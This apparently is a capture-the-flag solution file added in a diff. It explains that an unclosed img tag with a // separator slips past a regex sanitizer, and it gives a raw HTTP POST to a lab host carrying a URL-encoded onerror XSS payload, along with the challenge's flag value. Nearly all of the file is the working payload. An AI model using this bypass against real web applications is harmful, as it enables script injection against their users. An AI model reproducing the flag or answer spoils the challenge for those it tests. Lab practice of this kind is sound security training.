@@ -1,0 +1,7 @@
+# Unclosed img tag with // separator bypasses regex sanitizer. Browser parses onerror as separate attribute. src=x triggers load error, onerror=alert('XSS') fires. Flag: flag{77b2f057-5e03-472b-bd38-10297eb53229}
+
+POST /page HTTP/1.1
+Host: 172.17.0.1:42247
+Content-Length: 64
+
+solution=%3Cimg%2F%2Fsrc%3D%22x%22onerror%3Dalert%28%27XSS%27%29
